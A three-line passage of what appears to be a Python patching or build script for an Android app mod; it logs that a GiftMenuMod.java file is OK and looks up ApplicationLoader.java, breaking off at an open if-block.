     log("GiftMenuMod.java OK")
     al = find_java("ApplicationLoader.java")
     if al:
